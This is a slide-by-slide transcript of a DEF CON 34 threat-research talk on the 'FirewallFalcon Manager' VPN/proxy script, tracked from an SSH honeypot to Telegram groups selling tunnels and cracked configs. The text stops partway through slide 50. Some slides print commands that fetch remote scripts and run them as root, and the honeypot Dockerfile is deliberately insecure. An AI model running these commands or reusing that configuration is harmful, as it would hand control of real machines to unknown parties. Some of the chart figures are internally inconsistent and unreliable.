---
title: "Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure"
speakers: ["Assaf Morag"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf"
pages: 144
sha256: "22521e71cd216569b3b7b7adbc995a83837c3636dd082c853f70d5759bca6665"
text_chars: 50210
ocr_pages: 91
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.5
ocr_unreliable_blocks: 2
vision_verified_pages_changed: 141
vision_verified_pages: 144
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:24:17Z"
---
# Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure

**Speakers:** Assaf Morag  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Assaf Morag - Hacking the Hackers who Hack Hackers Supply-Chain Backdoors in Underground VPN Infrastructure - v2.pdf` (144 pages)


## Slide 1

# Hacking the Hackers Who Hack Hackers

**Supply-Chain Backdoors in Underground VPN Infrastructure**

**Assaf Morag**

## Slide 2

**The FirewallFalcon Journey**

A pirate treasure-map illustration of the talk's route. A compass rose (N, W, E, S) sits at the top left; the title banner reads "The FirewallFalcon Journey" above a skull and crossbones.

A dashed trail runs left to right through four stops:

1. **DISCOVERY** — a magnifying-glass medallion, marked "YOU ARE HERE" by a red arrow above it.
2. **DEEP DIVE** — a diving-helmet medallion.
3. **PIRATES AHEAD** — a medallion showing a black pirate flag.
4. A red X over a treasure chest, captioned on a scroll: "X MARKS THE SPOT".

## Slide 3

**HONEYPOTS**

## Slide 4

**HONEYPOTS**

A cloud made of overlapping service logos. The wordmarks legible on the page are Solr, ORACLE WebLogic and the `>_ SSH` terminal tile at the centre; the rest are icon-only marks.

## Slide 5

**HONEYPOTS RUNNING ON CONTAINERS**

## Slide 6

**HONEYPOTS RUNNING ON CONTAINERS**

```text
[ubuntu@FlareResearch:~/Honeypots/SSH$ cat Dockerfile
FROM ubuntu:24.04

USER root

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get install -y openssh-server sudo && \
    rm -rf /var/lib/apt/lists/*

RUN mkdir -p /var/run/sshd

RUN echo "root:root" | chpasswd

RUN for user in sock proxy vpn sshuser; do \
      useradd -m -s /bin/bash "$user"; \
      echo "$user:$user" | chpasswd; \
    done

RUN echo "%sudo ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

RUN sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config

EXPOSE 22

CMD ["/usr/sbin/sshd", "-D"]
ubuntu@FlareResearch:~/Honeypots/SSH$
```

## Slide 7

**HONEYPOTS RUNNING ON CONTAINERS**

The previous slide's Dockerfile, blurred, with one line enlarged in a callout panel:

```text
RUN echo "root:root" | chpasswd
```

## Slide 8

**SSH HONEYPOT**

An illustration: a cracked, smoking server rack with a warning triangle; above it a key beside an open padlock; beside it a damaged laptop whose screen shows a terminal icon labelled "SSH", a red warning triangle, and the words "CONNECTION FAILED".

## Slide 9

**IN ONE OF THESE ATTACKS**

```text
[ubuntu@FlareResearch:~/Honeypots/SSH$ cat attack_dump_379.json
{
  "@timestamp": "2026-01-25T12:42:18.481Z",
  "attack_number": 379,
  "event_type": "SSH_Honeypot",
  "host": {
    "hostname": "XX.XX.XX.XX"
  },
  "list_of_files": [
    {
      "name": "menu.sh",
      "origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/menu.sh",
      "sha256": "6cf1b4c3b2b0f7d7e9b8d0d8f65c6b2cxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
      "downloaded": true
    },
    {
      "name": "install_mod",
      "origin": "https://raw.githubusercontent.com/firewallfalcons/ProxyMods/main/install.sh",
      "sha256": "dbd52a18d2c9c16b4abfxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
      "downloaded": true
    },
    {
      "name": "install.sh",
      "origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/install.sh",
      "repository": "FirewallFalcon-Manager",
      "downloaded": true
    }
  ],
  "network": {
    "protocol": "HTTPS",
    "user_agent": "curl/8.5.0"
  }
}
ubuntu@FlareResearch:~/Honeypots/SSH$
```

(The two `sha256` values are truncated on the slide, their tails replaced by `x` characters; as printed they are 60 and 52 characters long, not the 64 a SHA-256 would have.)

## Slide 10

**IN ONE OF THESE ATTACKS**

The same `attack_dump_379.json` dump, blurred, with the third file entry enlarged in a callout panel:

```text
    {
      "name": "install.sh",
      "origin": "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/main/install.sh",
      "repository": "FirewallFalcon-Manager",
      "downloaded": true
    }
```

## Slide 11

**CROWDSTRICK’S FIREWALL FALCON MANAGER**

A software box shot. The front carries the CrowdStrike bird logo and wordmark, the title "CrowdStrike Falcon Pro", and a red "DIGITAL PRODUCT" badge; the spine reads "CROWDSTRIKE".

On the red lower panel:

Included Modules:

- Falcon Prevent
- FalconX
- Falcon Device Control
- Falcon Firewall Management

## Slide 12

**DOWNLOADED FROM GITHUB**

The same dump again, with the `install.sh` entry enlarged in a callout panel and its `origin` value ringed by hand — the ring encloses `"https://raw.githubusercontent.com/firewallfalcons/`. The callout runs off the right edge of the slide, so the URL is cut mid-path:

```text
    {
      "name": "install.sh",
      "origin":  "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager/ma
      "repository": "FirewallFalcon-Manager",
      "downloaded": true
    }
```

## Slide 13

**THE GITHUB REPOSITORY**

A screenshot of the repository README:

**FirewallFalcon Manager** (headed by an eagle icon)

**FirewallFalcon Manager** — A powerful and unified **proxy/VPN management script** for Linux servers. It supports multiple tunneling protocols, user management, SSL automation, and an Nginx gateway that handles all traffic efficiently.

**Quick Installation** (headed by a lightning icon)

Run the following command to install the latest version:

```text
curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager
```

The command is cut off at the right edge of the README's code box, which also carries a copy button.

Captions below the screenshot:

Deleted in May 2026
New and modified tool available now on: https://codeberg.org/firewallfalcons

## Slide 14

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

POWERFUL?

## Slide 15

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

POWERFUL?

UNIFIED?

## Slide 16

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

POWERFUL?

UNIFIED?

PROXY?

## Slide 17

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

POWERFUL?

UNIFIED?

PROXY?

VPN?

## Slide 18

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

POWERFUL?

UNIFIED?

MANAGEMENT

PROXY?

VPN?

## Slide 19

**WHY WAS IT INSTALLED INSIDE A HONEYPOT?**

POWERFUL?

UNIFIED?

PROXY?

VPN?

The word MANAGEMENT is gone from the centre of the slide; in its place is the illustration from the SSH HONEYPOT slide — a cracked, smoking server rack, a key and an open padlock, and a damaged laptop showing “SSH” and “CONNECTION FAILED”.

## Slide 20

**A LEAD TO A TELEGRAM GROUP**

The Firewall Falcons avatar — a falcon whose wing dissolves into red and blue pixel blocks, over the wordmark FIREWALL FALCONS.

Beside it, a clipping from the README:

**Community & Support**

- **Telegram Channel:** t.me/firewallfalcons - Join for updates and support!

## Slide 21

A full-page Shodan search screenshot; the slide carries no title of its own.

Search box, ringed in red: `"t.me/firewallfalcons"`

Nav: SHODAN · Explore · Downloads · Pricing · Account

**TOTAL RESULTS** — **204**, ringed in red

TOP COUNTRIES (a shaded world map sits above the list):

| Country | Results |
|---|---:|
| Germany | 64 |
| United States | 48 |
| Singapore | 19 |
| United Kingdom | 14 |
| France | 12 |

More...

TOP PORTS:

| Port | Results |
|---|---:|
| 80 | 97 |
| 8080 | 56 |
| 443 | 45 |
| 8888 | 2 |
| 81 | 1 |

More...

Tabs: View Report · Download Results · Historical Trend · View on Map · Advanced Search

Product Spotlight: Free, Fast IP Lookups for Open Ports and Vulnerabilities using InternetDB

Four results follow. In each one the `HTTP/1.1 101 t.me/firewallfalcons` banner line is ringed in red by hand.

**81.208.191.4** — Oracle Svenska AB — Saudi Arabia, Jeddah — tagged `cloud` — 2026-07-15T06:17:31.748990

```text
HTTP/1.1 101 t.me/firewallfalcons
Server: nginx
Date: Wed, 15 Jul 2026 06:17:31 GMT
Connection: upgrade
```

**38.248.6.105** — Cogent Communications — United States, Newark — 2026-07-15T05:22:42.191678

```text
HTTP/1.1 101 t.me/firewallfalcons
Server: nginx
Date: Wed, 15 Jul 2026 05:22:47 GMT
Connection: upgrade
```

**38.248.6.103** — Cogent Communications — United States, Newark — 2026-07-15T05:11:42.228347

```text
HTTP/1.1 101 t.me/firewallfalcons
Content-Length: 0
```

(the red ring covers the top half of the `Content-Length: 0` line)

**38.248.6.95** — Cogent Communications — United States, Newark — 2026-07-15T02:37:49.531589

SSL Certificate — Issued By: |- Common Name: **38.248.6.95**; Issued To: |- Common Name: **38.248.6.95**; Supported SSL Versions: **TLSv1.2, TLSv1.3**

```text
HTTP/1.1 101 t.me/firewallfalcons
Server: nginx
Date: Wed, 15 Jul 2026 02:37:49 GMT
Content-Length: 0
Connection: upgrade
```

## Slide 22

**DISCOVERING THE TELEGRAM GROUPS**

Two Telegram avatars side by side: on the left the FIREWALL FALCONS falcon logo, on the right a rainbow-coloured "FirewallFalcons GROUP" wordmark. A Telegram logo sits in the top-right corner of the slide.

Left — the broadcast channel:

| | |
|---|---|
| **Type** | Broadcast channel |
| **Members** | 3,843 |
| **Messages** | 329 |
| **Active window** | 23 Nov 2024 – 10 Jul 2026 |

Right — the chat group:

| | |
|---|---|
| **Type** | Chat group |
| **Members** | 982 |
| **Messages** | 1,661 |
| **Active window** | 18 Nov 2025 – 13 Jul 2026 |

## Slide 23

**DISCOVERING THE TELEGRAM GROUPS**

The same two avatars, each above a month-by-weekday activity heatmap. Both heatmaps span the same 21 columns — Nov and Dec 2024, Jan–Dec 2025, Jan–Jul 2026 — with rows Sun, Mon, Tue, Wed, Thu, Fri, Sat and a Total row underneath. A Telegram logo sits in the top-right corner of the slide.

**Activity timeline of the Telegram broadcast channel**

| 2024 Nov | Dec | 2025 Jan | Feb | Mar | Apr | May | Jun | Jul | Aug | Sep | Oct | Nov | Dec | 2026 Jan | Feb | Mar | Apr | May | Jun | Jul |
|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|
| 4 | 0 | 4 | 13 | 8 | 6 | 13 | 34 | 45 | 25 | 31 | 51 | 39 | 15 | 2 | 4 | 12 | 3-9 | 3-9 | 3-9 | 3-9 |

(the last four totals are printed as `3-9`, not as single figures)

**Activity timeline of the Telegram chat group**

| 2024 Nov | Dec | 2025 Jan | Feb | Mar | Apr | May | Jun | Jul | Aug | Sep | Oct | Nov | Dec | 2026 Jan | Feb | Mar | Apr | May | Jun | Jul |
|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|---:|
| 4 | 0 | 4 | 13 | 8 | 6 | 13 | 34 | 45 | 25 | 31 | 51 | 267 | 329 | 104 | 162 | 200 | 150 | 126 | 214 | 109 |

In the chat-group heatmap every cell from Nov 2024 to Oct 2025 is blank, even though the Total row under those columns repeats the broadcast channel's figures; the coloured cells begin at Nov 2025.

## Slide 24

**TELEGRAM LANGUAGE DISTRIBUTION**

A pie chart headed **LANGUAGE DISTRIBUTION**. The blue slice is labelled 72,08% and the red slice 27,92%.

| LANGUAGE | % |
|---|---|
| Latin / English (blue) | 72,08% |
| Arabic (red) | 27,92% |

## Slide 25

**TELEGRAM MENTIOND COUNTRIES DISTRIBUTION**

A pie chart headed **COUNTRY DISTRIBUTION**, with each slice labelled by percentage (51%, 28%, 17%, 15%, 13%, 11%, 9%, 8%, 6%, 4%, 2% …) and a legend table beside it. Each legend row carries a national flag icon.

| COUNTRY | % |
|---|---|
| Morocco | 51% |
| UK | 28% |
| Egypt | 17% |
| Ghana | 15% |
| India | 13% |
| Iraq | 13% |
| Sudan | 13% |
| Ireland | 11% |
| Jordan | 11% |
| Kenya | 11% |
| Brazil | 9% |
| Saudi | 9% |
| Algeria | 8% |
| Syria | 6% |
| Saudi Arabia | 4% |
| Tunisia | 4% |
| Chile | 2% |
| Germany | 2% |
| Nigeria | 2% |

(the legend lists "Saudi" at 9% and "Saudi Arabia" at 4% as separate rows, and the percentages total 229%)

## Slide 26

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

A Telegram post:

> **FirewallFalcon** — channel
> 🔥 OstoraPremium App Source Code FOR SALE 🔥
> 📩 Contact: @FirewallFalcon
> ↩ 1 · 👁 1 · 📌 10:35 AM

Below it, a screenshot of a download page:

**Ostora TV**

**Watch Live TV Sports Channel and HD Movies Free**

Fast · Free · Secure

Button: **DOWNLOAD OSTORA TV APK**

Security Verified — CM Security · Lookout · McAfee

Download Ostora TV APK to watch live TV, sports, and movies in HD.
Enjoy ad-free streaming, offline videos and multiple languages easily.

A phone mock-up on the right shows the app: header **Ostora.Org**, a **LIVE SPORTS** banner, and tiles LIVE TV, MOVIES, SERIES, SHOWS, ANIME, KIDS, SPORTS, FAVORITES, over a bottom bar reading Home, Categories, Live, Settings.

## Slide 27

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

A Telegram post:

> **FirewallFalcon** — channel
> Private service: Hacking any IPTV.
> Create your own IPTV.
> Hack any live football match websites.
>
> @FirewallFalcon · ↩ 4 · 👁 1 · 📌 2:55 PM

## Slide 28

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

Three numbered Telegram screenshots.

**1**

> 🔥 Hetzner Server Auction
> Discounted dedicated servers with full root access.
>
> 💰 Prices drop over time • ⚙️ Refurbished hardware • 🌍 EU datacenters
> Perfect for budget projects, labs, and long-term servers.
>
> 👉 https://www.hetzner.com/sb/
>
> Link preview — **Hetzner** / **Refurbished server for sale in Hetzner Server Auction** / Be quick and save money: Top and cheap refurbished dedicated servers at Hetzner Server Auction
>
> ❤️ 3 · 👁 3881 · 📌 4:53 PM

**2**

> Reply quoting **FirewallFalcon** — "🚨 SCAM ALERT – WARNING T…"
> I bought a VPS, but it's not working.
> 5:38 PM

**3**

> **Deleted Account**, quoting "I bought a VPS, but it's not working."
> He scammed you, you dummy. 😂🙂
> 6:37 PM

## Slide 29

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

A Telegram thread on the left, with two blue arrows pointing to enlargements of its two posts on the right.

First post:

> **FirewallFalcon**
> 🚀 Want a full tutorial on TCP Bypass Proxy?
> 💻 Learn how to bypass restrictions like a pro!
>
> 🔥 Like & drop a comment if you're interested —
> I'll post the full guide once we hit enough interest! 💬👇
>
> ⭐ · ❤️ 39 · 🔥 11 · 🥰 4 · 🎉 2 · 👁 3597 · 2:55 PM
> 19 comments

Second post:

> **FirewallFalcon**
> (quoting **FirewallFalcon**: 🚀 Want a full tutorial on TCP Bypass Proxy? 💻 Learn …)
> If  You have a clean Vps Contact me to do the tutorial on it
>
>  Ubuntu 20.04.6 LTS is recommended
> x86-64 architecture
>
> @firewallfalcon
> ⭐ · 🔥 7 · ❤️ 1 · 👁 3346 · edited 3:45 PM
> Leave a comment

A date divider at the foot of the thread reads June 4, 2025.

## Slide 30

**MALICIOUS ACTIVITY IN THE TELEGRAM GROUPS**

A Telegram post dated **July 14**, from **FirewallFalcon**.

The attached image is a VPN client screen headed **SENTINEL TUNNEL** (hamburger menu left, gear icon right), showing a countdown **00:14:29** under a small label, then **52.22 KB/s** (UPLOAD) and **74.46 KB/s** (DOWNLOAD) either side, a large green **DISCONNECT** dial, and below it a configuration dropdown reading "Inwi  OpenVPN" and a **SERVER** dropdown reading "Server 1". A red rubber-stamp graphic across the middle reads **Cracked by @FirewallFalcon**, its right edge cut off by the image border.

Caption:

> Sentinel Tunnel  Servers and Configs Fully Decrypted
>
> By:@FirewallFalcon
>
> 🔥🔥🔥🔥🔥
> ⭐ · 🔥 4 · ❤️ 1 · 👁 410 · 📌 4:14 PM
> 2 comments

## Slide 31

A full-bleed infographic; the slide carries no title of its own.

| CONTENT TYPE | MSGS | % OF 329 |
|---|---:|---:|
| FirewallFalcon related (infrastructure / artifacts / URLs / configs / logs / panels / etc.) | 157 (48%) | 48.0% |
| Tunnel / VPN / config selling | 26 | 7.9% |
| Carrier-name targeting | 14 | 4.3% |
| Hacking / recon tooling | 11 | 3.3% |
| Payment / monetization | 6 | 1.8% |
| Cracked / pirated releases | 3 | 0.9% |
| Other content (not shown) | 221 | 67.2% |

Each row has a horizontal bar; the x-axis is labelled NUMBER OF MESSAGES with ticks at 0, 10, 20, 30, 40, 50. The FirewallFalcon-related bar is red and runs past the plotted range; the "Other content (not shown)" bar is drawn as an empty dashed outline. Each row also carries an icon, the first being the FIREWALL FALCON bird logo.

Footer banner:

FIREWALLFALCON RELATED CONTENT: 157 MESSAGES (48% OF TOTAL 329)

## Slide 32

A full-bleed infographic; the slide carries no title of its own.

| CONTENT TYPE | MSGS | % OF 1,661 |
|---|---:|---:|
| FirewallFalcon related (infrastructure / artifacts / URLs / configs / logs / panels / etc.) | 165 (10.00%) | 9.93% |
| Tunnel / VPN / config selling | 61 | 3.67% |
| Carrier-bypass config | 59 | 3.55% |
| Carrier-name targeting | 34 | 2.05% |
| Cracked / pirated | 14 | 0.84% |
| Hacking / recon | 10 | 0.60% |
| Payment / monetization | 8 | 0.48% |

Each row has a horizontal bar; the x-axis is labelled NUMBER OF MESSAGES with ticks at 0, 10, 20, 30, 40, 50, 60, 70. The FirewallFalcon-related bar is red and runs past the plotted range. Each row carries an icon, the first being the FIREWALL FALCON bird logo.

Beneath the chart, beside a small pie:

MESSAGES IN DISPLAYED CATEGORIES — **186** (11.20%) | OTHER CONTENT — **1,475** (88.80%)

Footer banner:

FIREWALLFALCON RELATED CONTENT: 165 MESSAGES (10.00% OF TOTAL 1,661)

## Slide 33

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

A Telegram post dated **June 8, 2025**, from **FirewallFalcon**, carrying two terminal screenshots of the manager's menus (shown full size on the next slide).

> 🚀 🔥 FirewallFalcon Manager — COMING SOON! 🔥🚀
>
> Ultimate SSH Manager for ARM & x64 devices 🖥️🦅
>
> 🛠️ Now’s your chance to help shape it!
> 👉 Do YOU want any specific features?
> 👉 Any modifications you’d like to see?
>
> 🔥 🔥Under Development 🔥 🔥
>
> ⭐ · 🔥 11 · ❤️ 4 · 👁 4307 · edited 6:00 PM
> 10 comments

## Slide 34

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

Two terminal screenshots side by side.

Left — the main menu:

```text
                FirewallFalcon Manager v1.0                |
 SYSTEM               | RESOURCES     | USERS
 OS: Ubuntu 24.04.2   | CPU: 5.0%     | Online: 1
 Uptime: 5 hours, 4   | RAM: 2.85%    | Total: 0
                      | Cores: 4      | Expired: 0

   USER MANAGEMENT        |

    1) Create New User          5) Unlock User Account
    2) Delete User              6) List All Managed Users
    3) Edit User Details        7) Renew User Account
    4) Lock User Account

   SYSTEM UTILITIES       |

    8) Protocol Management      9) Cleanup Expired Users

   DANGER ZONE            |

   10) Uninstall FirewallFalcon   0) Exit
Select an option: ▊
```

Right — the Protocol Management submenu:

```text
                FirewallFalcon Manager v1.0                |
 SYSTEM               | RESOURCES     | USERS
 OS: Ubuntu 24.04.2   | CPU: 4.5%     | Online: 1
 Uptime: 5 hours, 4   | RAM: 2.90%    | Total: 0
                      | Cores: 4      | Expired: 0

      PROTOCOL MANAGEMENT       |

    1) Install badvpn (UDP 7300) (Active)
    2) Uninstall badvpn
    3) Install SSL Tunnel (Port 443) (Active)
    4) Uninstall SSL Tunnel
    5) Install WebSocket Proxy (80, 8080) (Active)
    6) Uninstall WebSocket Proxy
    ─────────────────────────────────────────
    0) Return to Main Menu
Select an option: ▊
```

In both panels the `Uptime: 5 hours, 4` line is clipped by the panel border.

## Slide 35

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

A Telegram post dated **June 19, 2025**, from **FirewallFalcon**, quoting an earlier **FirewallFalcon** post shown as "Photo" with a terminal thumbnail.

> 🚀 New Feature Suggestion! 🚀
>
> Would you like us to add a Cloudflare Domain Option 🌐 to the script?
>
> 👁 2707 · 4:42 PM
> 9 comments

## Slide 36

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

A Telegram post from **FirewallFalcon**:

> 🌐 💥 Should I Create a New UDP Protocol for You? 💥 🌐
>
> I’ve been thinking...
> What if we had our own custom UDP protocol — built from scratch, optimized for speed, stealth, and bypassing ISP restrictions? 🔒📡
> 💬 Also — does UDP work on your network for free?
>
> ⭐ · 🎉 11 · ❤️ 5 · 👁 2308 · edited 5:56 PM
> 9 comments

## Slide 37

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

A Telegram post from **FirewallFalcon**:

> 🚀 Testing a New SSL Tunnel 🚀
>
> 🔒 SSH over HAProxy SSL is now being tested!
>
> 👉 This method could help bypass fingerprinting by firewalls and improve stealth.
>
> If you’re interested in trying it out or want more details, drop a reaction below! 👇
>
> ⭐ · 🤩 22 · 🔥 12 · 👁 3373 · edited 7:15 PM
> 4 comments

## Slide 38

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

A Telegram post dated **June 29, 2025**, from **FirewallFalcon**, quoting an earlier **FirewallFalcon** post shown as "Photo" with a terminal thumbnail.

> 🚀 New Feature Poll 🚀
>
> **Should we add v2ray DNSTT support to the script?**
> Anonymous Poll
>
> ◯ Yes
>
> ◯ No
>
> 114 votes
>
> ⭐ · ❤️ 2 · 👁 2183 · 9:33 AM
> Leave a comment

## Slide 39

**ANALYZING THE FIREWALL FALCON RELATED CONTENT**

Two Telegram posts under the date **November 18, 2025**.

> **FirewallFalcon** — channel
> 📢 FirewallFalcon Manager Update Coming Soon
>
> A new update is on the way with enhanced SSH user management.
> If a user exceeds their usage limits, they will be disconnected from all devices and locked for 120 seconds before regaining access.
>
> ❤️ 5 · 🥳 1 · 👁 2668 · 📌 12:49 PM

> **FirewallFalcon** — channel
> 🔥 MAJOR UPDATE AVAILABLE FOR FirewallFalcon Manager
>
> ⚠️ CRITICAL STEPS — READ CAREFULLY:
>
> 1️⃣ BACKUP your users first! Do not forget this. 💾
> 2️⃣ UNINSTALL the old script entirely. 🗑️
> 3️⃣ INSTALL the new version below: 👇
>
> ```text
> bash <(curl -fsSL https://thefirewoods.org)
> ```
>
> 🔥 1 · 👁 2698 · 📌 1:10 PM

## Slide 40

**LET’S RECAP…**

A left-to-right chain of four images joined by three single-headed arrows, each pointing right:

1. A cracked, smoking server rack beside a laptop showing an SSH terminal icon, a red warning triangle and the words "CONNECTION FAILED", with a key and an open padlock above.
2. The FIREWALL FALCONS falcon logo.
3. The Telegram logo.
4. A hooded figure at a laptop, a skull glowing on its screen.

## Slide 41

**The FirewallFalcon Journey**

The treasure map from slide 2 again, unchanged except that the red "YOU ARE HERE" arrow has moved: it now points down at **DEEP DIVE**, the second stop, rather than at **DISCOVERY**.

A compass rose (N, W, E, S) sits at the top left; the title banner reads "The FirewallFalcon Journey" above a skull and crossbones. The dashed trail runs left to right through **DISCOVERY** (magnifying glass), **DEEP DIVE** (diving helmet), **PIRATES AHEAD** (pirate flag) and ends at a red X over a treasure chest, captioned on a scroll: "X MARKS THE SPOT".

## Slide 42

**CRUSH COURSE ON VPN**

A left-to-right diagram:

- **Client** (laptop) — a solid arrow points right to **VPN Server**. A padlock shield sits on the arrow at the client end, and the arrow is labelled **Encrypted tunnel**.
- **VPN Server** (rack, with a green padlock shield on it) — a dashed arrow points right to **Internet** (cloud).

## Slide 43

**WHY USE A VPN?**

Two illustrations side by side: on the left a speech bubble inside a red prohibition circle, crossed by a red band reading **CENSORED**; on the right a blue shield holding a gold padlock, over a banner reading **PRIVACY**.

## Slide 44

**WHAT DOES FIREWALL FALCON OFFER?**

**The Core Concept: One HTTPS Entry Point, Many Hidden Services**

At a high level, these stacks are built around three layers:

- <u>Entry Layer</u>: Web Infrastructure (Usually Nginx) that acts as the public-facing HTTPS server and traffic router.
- <u>Transport Layer</u>: Tunnel Frameworks (V2Ray, XRay, WebSocket tunnels, DNS tunnels) encapsulate traffic inside allowed protocols.
- <u>Service Layer</u>: Actual Functionality, which include VPN connections, SSH sessions, proxy relays, or arbitrary TCP tunnels.

## Slide 45

**WHAT DOES FIREWALL FALCON OFFER?**

Two left-to-right diagrams.

Top row:

- **Client** (laptop) — a solid arrow points right to **Web Server**, with a padlock on the arrow and the label **HTTPS**.
- **Web Server** — a dashed arrow points right to a cloud labelled **(Unknown internal routing)**.

Bottom row:

- **Client** (laptop) → solid arrow → **Obfuscated transport** (a rainbow shield with a padlock)
- **Obfuscated transport** → solid arrow → **Tunnel core** (a mesh cylinder)
- **Tunnel core** → solid arrow → **Routing rules** (a clipboard of ticked items)
- **Routing rules** → dashed arrow → **Outbound** (three stacked arrows, blue, red and orange, all pointing right)

## Slide 46

**LET’S INSTALL (AS A CONTAINER)**

```text
[ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker build -t tests/firewallfalcon .
[+] Building 19.1s (9/9) FINISHED                                                             docker:default
 => [internal] load build definition from Dockerfile                                                    0.0s
 => => transferring dockerfile: 212B                                                                    0.0s
 => [internal] load metadata for docker.io/library/ubuntu:latest                                        0.2s
 => [internal] load .dockerignore                                                                       0.0s
 => => transferring context: 2B                                                                         0.0s
 => CACHED [1/4] FROM docker.io/library/ubuntu:latest@sha256:b7f48194d4d8b763a478a621cdc81c27be222ba2206ca3ca6bc42b49685f3d9e   0.0s
 => => resolve docker.io/library/ubuntu:latest@sha256:b7f48194d4d8b763a478a621cdc81c27be222ba2206ca3ca6bc42b49685f3d9e          0.0s
 => [internal] load build context                                                                       0.0s
 => => transferring context: 3.70kB                                                                     0.0s
 => [2/4] RUN apt-get update && apt-get install -y wget                                                10.3s
 => [3/4] COPY . .                                                                                      0.3s
 => [4/4] RUN chmod +x ./FirewallFalcon-Manager/install.sh                                              0.4s
 => exporting to image                                                                                  7.7s
 => => exporting layers                                                                                 6.2s
 => => exporting manifest sha256:deef2a62ef045fe3924eb34f123994f7762d9b4d530f44d9b2b9712cfd8bcde0        0.0s
 => => exporting config sha256:1d53d0a78c80aae0eb3a30c1e2b159abc77074982dc5f3991c957a8c60f02a26          0.0s
 => => exporting attestation manifest sha256:1b1c7be20b69088ba74e10f78db882eba898f2e59d851059f488c445b7caba87   0.0s
 => => exporting manifest list sha256:f406e3d798c398205716b1c367f06aa92285f030d764fa2d21ee580973480aac   0.0s
 => => naming to docker.io/tests/firewallfalcon:latest                                                  0.0s
 => => unpacking to docker.io/tests/firewallfalcon:latest                                               1.3s
[ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker run -dit tests/firewallfalcon
 df928c69dc21801c508999f8bdc5ca237b2dc56c74fb1be7a0646b48438fd618
[ubuntu@FlareResearch:~/Research/February-26/FirewallFalcon$ sudo docker ps -a
CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS                      PORTS     NAMES
df928c69dc21   tests/firewallfalcon   "sh ./FirewallFalcon…"   3 seconds ago    Exited (8) 2 seconds ago              bold_kilby
2d53844b97f1   f259b650c524           "sh ./FirewallFalcon…"   2 minutes ago    Exited (127) 2 minutes ago            goofy_diffie
```

A further `docker ps -a` row is cut off by the bottom edge of the terminal pane.

## Slide 47

**LET’S INSTALL (FROM INSIDE A CONTAINER)**

```text
[root@ac41f4243a45:/FirewallFalcon-Manager# ./install.sh
Installing FirewallFalcon Manager...
```

A second, smaller pane below:

```text
root@ip-172-31-32-128:~# curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
```

## Slide 48

**LET’S INSTALL (NON-ROOT)**

```text
ubuntu@FlareResearch:~/Containers/FirewallFalcon-Manager$ ./install.sh
Error: This script must be run as root.
```

## Slide 49

**LET’S INSTALL (ON A NEW VM-LAB)**

```text
[root@ip-172-31-32-128:~# curl -L -o install.sh "https://raw.githubusercontent.com/firewallfalcons/FirewallFalcon-Manager]
/main/install.sh" && chmod +x install.sh && sudo ./install.sh && rm install.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2124  100  2124    0     0  13355      0 --:--:-- --:--:-- --:--:-- 13443
sudo: unable to resolve host ip-172-31-32-128: Name or service not known
Installing FirewallFalcon Manager...
Applying FirewallFalcon SSH configuration...
SSH configuration validated.
SSH service restarted.
⚙️Initializing FirewallFalcon Manager setup...
🔷 Configuring user limiter service...
✅ Setup finished.
Installation complete!
Type 'menu' to start.
root@ip-172-31-32-128:~# ▊
```

## Slide 50

**LET’S PLAY**

A blue arrow points from the left of the slide at the `[ 1] Create New User` line.

```text
FirewallFalcon Manager | v3.5.0 Premium Edition
─────────────────────────────────────────────────────────
OS         Ubuntu 24.04.3 LTS   | Uptime: 6 hours, 41 minutes
Memory     22.60% Used          | Online Sessions: 0
Users      0 Managed Accounts   | Sys Load (1m): 0.03
─────────────────────────────────────────────────────────

═══════════[ 👤 USER MANAGEMENT ]═══════════
 [ 1] Create New User            [ 5] Unlock User Account
 [ 2] Delete User                [ 6] Edit User Details
 [ 3] Renew User Account         [ 7] List Managed Users
 [ 4] Lock User Account          [ 8] Generate Client Config

